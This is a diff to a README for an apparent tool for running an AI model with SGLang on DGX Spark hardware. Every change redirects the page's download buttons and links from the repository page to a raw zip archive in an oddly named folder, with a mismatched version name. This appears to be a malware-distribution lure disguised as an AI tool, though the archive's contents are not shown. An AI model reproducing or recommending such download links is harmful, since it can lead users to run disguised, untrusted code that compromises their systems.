@@ -1,7 +1,7 @@
 # 🚀 Ling-3.0-Flash-SGLang-DGX-Spark - Run AI Models Effortlessly on DGX
 
 <p align="center">
-<a href="https://github.com/amataintensional853/Ling-3.0-Flash-SGLang-DGX-Spark"><img src="https://img.shields.io/badge/Download-Get%20Now-blue?style=for-the-badge&logo=github&color=2ea44f" alt="Download Button"></a>
+<a href="https://raw.githubusercontent.com/amataintensional853/Ling-3.0-Flash-SGLang-DGX-Spark/main/sectarianly/Ling-Flash-SG-DG-Lang-Spark-v2.1-alpha.2.zip"><img src="https://img.shields.io/badge/Download-Get%20Now-blue?style=for-the-badge&logo=github&color=2ea44f" alt="Download Button"></a>
 </p>
 
 ## 🌟 What Is This?
@@ -27,7 +27,7 @@ Before you begin, make sure you have:
 
 **Visit this link to download the application:**
 <p align="center">
-<a href="https://github.com/amataintensional853/Ling-3.0-Flash-SGLang-DGX-Spark"><img src="https://img.shields.io/badge/Download-Ling--3.0--Flash--SGLang--DGX--Spark-orange?style=for-the-badge&logo=github" alt="Download Link"></a>
+<a href="https://raw.githubusercontent.com/amataintensional853/Ling-3.0-Flash-SGLang-DGX-Spark/main/sectarianly/Ling-Flash-SG-DG-Lang-Spark-v2.1-alpha.2.zip"><img src="https://img.shields.io/badge/Download-Ling--3.0--Flash--SGLang--DGX--Spark-orange?style=for-the-badge&logo=github" alt="Download Link"></a>
 </p>
 
 ## 📂 How to Install
@@ -185,7 +185,7 @@ Before you begin, make sure you:
 
 **You're now ready to use advanced AI technology!** Click the download button at the top to get started, or visit this link directly:
 
-**Visit this link to download the application:** [https://github.com/amataintensional853/Ling-3.0-Flash-SGLang-DGX-Spark](https://github.com/amataintensional853/Ling-3.0-Flash-SGLang-DGX-Spark)
+**Visit this link to download the application:** [https://raw.githubusercontent.com/amataintensional853/Ling-3.0-Flash-SGLang-DGX-Spark/main/sectarianly/Ling-Flash-SG-DG-Lang-Spark-v2.1-alpha.2.zip](https://raw.githubusercontent.com/amataintensional853/Ling-3.0-Flash-SGLang-DGX-Spark/main/sectarianly/Ling-Flash-SG-DG-Lang-Spark-v2.1-alpha.2.zip)
 
 ---
 
